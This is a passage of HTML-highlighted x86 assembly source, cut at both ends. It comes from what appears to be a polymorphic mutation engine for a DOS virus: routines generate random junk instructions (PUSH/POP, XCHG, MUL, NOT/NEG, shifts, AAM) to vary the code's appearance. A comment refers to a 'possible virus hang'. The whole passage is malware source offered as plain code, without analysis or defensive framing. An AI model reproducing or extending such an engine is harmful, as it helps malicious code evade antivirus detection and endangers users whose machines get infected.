                    </span><span class="sc1">; MOV AX, word</span><span class="sc0">
</span><span class="sc5">push_counter</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_watch</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">make_push_sreg</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">override_switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">make_pop_es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">make_pop_es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">     </span><span class="sc1">; 50% probability for POP DS</span><span class="sc0">

</span><span class="sc5">make_pop_es</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">jmp2_write_byte</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">BYTE_OP_WORD_RG</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_3</span><span class="sc0">   </span><span class="sc1">; returns 0 - 2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ax_zero</span><span class="sc0">     </span><span class="sc1">; probability 33%</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">

</span><span class="sc5">ax_zero</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_push_or_pop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">; =     ; CMP AX, word</span><span class="sc0">
</span><span class="sc5">stack_watch</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">push_it</span><span class="sc0">     </span><span class="sc1">; if push_counter = stack_watch</span><span class="sc0">
                    </span><span class="sc1">; cant generate pop</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; pop word to register</span><span class="sc0">

</span><span class="sc5">push_it</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">no_push_or_pop</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; select target register</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">push_generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; exclude sp(xchange 4 bp)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">generate_code</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">generate_code</span><span class="sc0">

</span><span class="sc5">push_generated</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">

</span><span class="sc5">generate_code</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">group_oper_r16</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2_write_byte</span><span class="sc0">

</span><span class="sc5">ONE_BYTE_TRASH</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">whole_trash</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">whole_trash</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">select_one_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">

</span><span class="sc5">select_one_1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">trash_byte_tbl</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2_write_byte</span><span class="sc0">

</span><span class="sc5">AAM_AAD_INreg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D4h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">AAM_AAD</span><span class="sc0">     </span><span class="sc1">; AAM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">switch_clear</span><span class="sc0">    </span><span class="sc1">; sometimes generate NOP instead AAM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">    </span><span class="sc1">; IN AL/AX, port 8bit</span><span class="sc0">

</span><span class="sc5">AAM_AAD</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_opcode</span><span class="sc0"> </span><span class="sc1">; make opcode and write it</span><span class="sc0">
                    </span><span class="sc1">; down</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jmp_2_jmp_2wb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0D4h</span><span class="sc1">; if AAM generated, 2nd byte can't</span><span class="sc0">
                    </span><span class="sc1">; be 0 !</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jmp_2_jmp_2wb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; put 1 there</span><span class="sc0">

</span><span class="sc5">jmp_2_jmp_2wb</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp2_write_byte</span><span class="sc0">

</span><span class="sc5">PUSH_</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Grp3 r,m16 -next byte</span><span class="sc0">
                    </span><span class="sc1">; contains opcode</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000111b</span><span class="sc0">   </span><span class="sc1">; clear reg field</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110000b</span><span class="sc0"> </span><span class="sc1">; set r/m field to 6 -&gt; PUSH</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_not_fix_regs</span><span class="sc0">

</span><span class="sc5">XCHG_REG_REG</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000110b</span><span class="sc0">   </span><span class="sc1">; XCHG r,r/m</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">byte_xchg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_opcode</span><span class="sc0">   </span><span class="sc1">; handle ModR/M byte</span><span class="sc0">

</span><span class="sc5">jmpfixregfield</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fix_reg_field</span><span class="sc0">   </span><span class="sc1">; in ModR/M byte</span><span class="sc0">

</span><span class="sc5">byte_xchg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_opcode</span><span class="sc0">   </span><span class="sc1">; handle ModR/M byte</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_2_jmp_2wb</span><span class="sc0">

</span><span class="sc5">LEA_LDS_LES_</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_3</span><span class="sc0">   </span><span class="sc1">; returns 0 - 2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_not_zero</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">override_switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_not_zero</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; generate LDS reg 16, mem</span><span class="sc0">

</span><span class="sc5">is_not_zero</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">LEA_LDS_LES</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">do_not_fixmod</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">     </span><span class="sc1">; clear mod field (can't generate</span><span class="sc0">
                    </span><span class="sc1">; lea reg,reg</span><span class="sc0">

</span><span class="sc5">do_not_fixmod</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmpfixregfield</span><span class="sc0">

</span><span class="sc5">ArOp1_2_Grp1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; returns 0 to 7</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">loc_0_7C0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; ArOp1(2) r/m,imm8/16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; CY = 1 if operation with word</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">byte_xchg</span><span class="sc0">

</span><span class="sc5">test_4_word</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jmprndword</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rnd_byte</span><span class="sc0">

</span><span class="sc5">jmprndword</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rnd_word</span><span class="sc0">

</span><span class="sc5">loc_0_7C0</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; grp1 r/m8(16)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; returns 0 to 7</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">

</span><span class="sc5">loc_0_7CE</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; TEST  reg,reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">test_4_word</span><span class="sc0">

</span><span class="sc5">second_opcode</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; handle ModR/M byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_40h</span><span class="sc0"> </span><span class="sc1">; This generation may cause</span><span class="sc0">
                    </span><span class="sc1">; problems &amp; possible virus hang !!!</span><span class="sc0">
                    </span><span class="sc1">; on following returns:</span><span class="sc0">
                    </span><span class="sc1">; ArOp2 : 001???,100???,110???</span><span class="sc0">
                    </span><span class="sc1">; Shftop: 110???</span><span class="sc0">
                    </span><span class="sc1">; Grp1: 001???</span><span class="sc0">
                    </span><span class="sc1">; Grp2: 111???</span><span class="sc0">
                    </span><span class="sc1">; Grp3: only 000???, 001??? re  correct(this is generated not this way and can fail)</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">not_word_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">;  SP generated ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_word_size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; fix it to BP</span><span class="sc0">

</span><span class="sc5">not_word_size</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">   </span><span class="sc1">; set mod field 2 11 - 2nd oper</span><span class="sc0">
                    </span><span class="sc1">; is reg</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">MUL_and_IMUL</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; Grp1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001111b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100000b</span><span class="sc0"> </span><span class="sc1">; IMUL or MUL</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_not_fix_regs</span><span class="sc0">

</span><span class="sc5">NOT_and_NEG</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; grp 1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_10h</span><span class="sc0"> </span><span class="sc1">; returns 0 - F</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010000b</span><span class="sc0">   </span><span class="sc1">; NOT,NEG reg, reg</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">byte_operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; SP generated ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">byte_operation</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; so put BP there !</span><span class="sc0">

</span><span class="sc5">byte_operation</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">jmp_write_word</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write_word</span><span class="sc0">

</span><span class="sc5">SHFT_1orCL</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">  </span><span class="sc1">; shftop r/m8(m16),1(cl)</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_40h</span><span class="sc0"> </span><span class="sc1">; returns 0 - 3F</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; if is return 2? then is invalid</span><span class="sc0">
                    </span><span class="sc1">; instruction generated !!!!!!!!!</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">operand_word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; SP generated ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">operand_word</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; replace with BP</span><span class="sc0">

</span><span class="sc5">operand_word</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">

</span><span class="sc5">jmpwritebyte</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">clear_stack</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
